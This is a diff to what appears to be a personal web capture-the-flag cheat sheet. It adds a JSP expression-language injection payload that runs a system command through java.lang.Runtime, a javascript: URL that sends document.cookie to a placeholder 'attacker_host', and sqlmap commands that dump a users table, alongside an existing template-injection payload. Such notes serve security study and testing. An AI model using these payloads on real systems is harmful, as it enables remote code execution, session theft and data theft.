@@ -294,8 +294,14 @@ Clone:
     poc = "${"+getClass("java.util.Arrays")+".toString("+getClass("java.nio.file.Files")+".list("+getClass("java.nio.file.Paths")+".get("+getString("/")+")).toArray()"+")}"
     poc = "<input th:value="+poc+">"
     ```
+- JSP JSTL_EL
+    ```
+    <spring:message text="${/"/".getClass().forName(/"java.lang.Runtime/").getMethod(/"getRuntime/",null).invoke(null,null).exec(/"calc/",null).toString()}">
+    </spring:message>
+    ```
 
 - https://github.com/w181496/Web-CTF-Cheatsheet#ssti
+- https://y4er.com/post/java-expression-injection/
 - [Server\-Side Template Injection \| PortSwigger Research](https://portswigger.net/research/server-side-template-injection)
 - [ZAP-ESUP: ZAP Efficient Scanner for Server Side Template](https://fenix.tecnico.ulisboa.pt/downloadFile/563345090416415/79039-Diogo-silva-thesis.pdf)
     - p. 51: payloads
@@ -317,6 +323,7 @@ Clone:
     ```
 - Request URL protocol
     - `view-source:file:///foo`
+    - `javascript:window.location='attacker_host'+document.cookie`
 - localhost ip octal / hexadecimal / 32bit integer / classful network encoding
     - e.g.
         ```
@@ -660,8 +667,15 @@ sqlmap.py -u http://ctf.sharif.edu:8086/ --method=POST --data="book_selection=a"
 
 # Boolean-based blind sqli
 sqlmap.py -u http://ctf.sharif.edu:8082/login.php --method=POST --data="username=a&password=b" -p username --technique=B --string injection --dbms=MySQL --risk=3 -D irish_home -T users --dump --prefix="aa\""
-
+# ||
 ~/share/ctf/2021/tamy/blind_sqli_bitmask.py
+
+# Preprocessing (i.e. set dynamic content in request based on payload)
+~/code/snippets/ctf/web/sqlmap_preprocess_wrap.py
+
+# Tamper (i.e. encode payload)
+~/code/snippets/ctf/web/sqlmap_tamper_wrap.py
+~/share/opt/sqlmap/tamper/
 ```
 
 - Error-based
